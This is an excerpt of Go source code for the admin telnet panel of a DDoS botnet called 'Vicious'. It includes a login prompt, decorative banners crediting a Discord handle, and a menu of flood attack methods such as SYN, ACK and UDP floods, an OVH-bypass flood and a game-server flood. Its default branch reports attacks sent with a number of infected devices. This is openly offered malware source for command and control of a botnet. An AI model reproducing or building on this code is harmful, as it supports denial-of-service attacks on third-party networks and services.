...
func Admin(conn net.Conn) {
	defer conn.Close()
	if _, err := conn.Write([]byte("\x1bc\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22\033]0;I love your sexy net, I love Vicious Bees!\007")); err != nil {
		return
	}
	...
	// username
	username, err := Read(conn, "\x1b[37mVicious@botnet:~# ", "", 20)
	if err != nil {
		return
	}
	...
	// password
	password, err := Read(conn, "\x1b[37mVicious@botnet:~# ", "*", 20)
	if err != nil {
		return
	...
	if account.NewUser {
		...
		newpassword, err := Read(conn, "\x1b[37mVicious@botnet:~# ", "*", 20)
		if err != nil {
			return
		}
	...
	conn.Write([]byte("\r\n\x1b[37mI love your sexy net, I love Vicious Bees!\r\n"))
	conn.Write([]byte("\x1b[37mWelcome! Enter type '?' For help\r\n\r\n"))
	for {
		command, err := ReadWithHistory(conn, fmt.Sprintf("\x1b[37m%s@botnet[97m[38;2;108;61;255m~[97m$  ", session.User.Username), "", 60, session.History)
		if err != nil {
			return
		}
		...
		case "clear", "cls", "c":
			...
			conn.Write([]byte("\033[2J\033[1H\x1b[0m"))
			conn.Write([]byte("[38;5;125mHave[38;5;161m a ni[38;5;197mce day al[38;5;198ml custome[38;5;199mr Owne[38;5;200mr: @wither.dev\r\n"))
			conn.Write([]byte("\r\n"))
			conn.Write([]byte("[38;5;27m                              ╦  ╦╦╔═╗╦╔═╗╦ ╦╔═╗\r\n"))
			conn.Write([]byte("[38;5;33m                              ╚╗╔╝║║  ║║ ║║ ║╚═╗\r\n"))
			conn.Write([]byte("[38;5;39m                               ╚╝ ╩╚═╝╩╚═╝╚═╝╚═╝   Raw V1\r\n"))
			conn.Write([]byte("[38;5;21m               ╔═════════════════════════════════════════════╗\r\n"))
			conn.Write([]byte("[38;5;27m                     Viciius Dev by discord: @wither.dev \r\n"))
			conn.Write([]byte("[38;5;33m               ╚═════════════════════════════════════════════╝\r\n"))
			conn.Write([]byte("[38;5;39m                    ╔═════════════════════════════════════╗ \r\n"))
			conn.Write([]byte("[38;5;45m                     - Welcome! Enter type '?' For help  -\r\n"))
			conn.Write([]byte("[38;5;21m                    ╚═════════════════════════════════════╝\r\n"))
			conn.Write([]byte("\r\n\n"))
			continue
		...
		case "methods", "syntax":
			...
			conn.Write([]byte("\033[2J\033[1H\x1b[0m"))
			session.Conn.Write([]byte("[38;5;196m┌──────────────────────────────────────────────────────────────────────────────┐\r\n"))
			session.Conn.Write([]byte("[38;5;196m│[38;5;231m1        udpthread    UDP threading, DGRAM UDP with less PPS Speed            [38;5;196m│\r\n"))
			session.Conn.Write([]byte("[38;5;196m│[38;5;231m2        synflood:    TCP flooding with syn flags.                            [38;5;196m│\r\n"))
			session.Conn.Write([]byte("[38;5;196m│[38;5;231m3        ackflood:    TCP flooding with ack flags.                            [38;5;196m│\r\n"))
			session.Conn.Write([]byte("[38;5;196m│[38;5;231m4        ppsflood:    UDP flood for high pps.                                 [38;5;196m│\r\n"))
			session.Conn.Write([]byte("[38;5;196m│[38;5;231m5        sackflood:   Custom ack flood.                                       [38;5;196m│\r\n"))
			session.Conn.Write([]byte("[38;5;196m│[38;5;231m6        socket:      TCP flood for high connections.                         [38;5;196m│\r\n"))
			session.Conn.Write([]byte("[38;5;196m│[38;5;231m7        tcpbypass:   TCP custom flood for bypassing.                         [38;5;196m│\r\n"))
			session.Conn.Write([]byte("[38;5;196m│[38;5;231m8        stdhex       STDHEX flood(bypasses ovh server)                       [38;5;196m│\r\n"))
			session.Conn.Write([]byte("[38;5;196m│[38;5;231m9        vseflood:    Value source engine flood.                              [38;5;196m│\r\n"))
			session.Conn.Write([]byte("[38;5;196m│[38;5;231m10       game: tcp based custom flood for games.                              [38;5;196m│\r\n"))
			session.Conn.Write([]byte("[38;5;196m└──────────────────────────────────────────────────────────────────────────────┘\r\n"))
		...
		default:
			...
			if len(Clients) <= 1 { // 1 or less clients broadcasted too
				session.Conn.Write([]byte(fmt.Sprintf("\x1b[37mAttack sent with %d devices!\x1b[0m\r\n", len(Clients))))
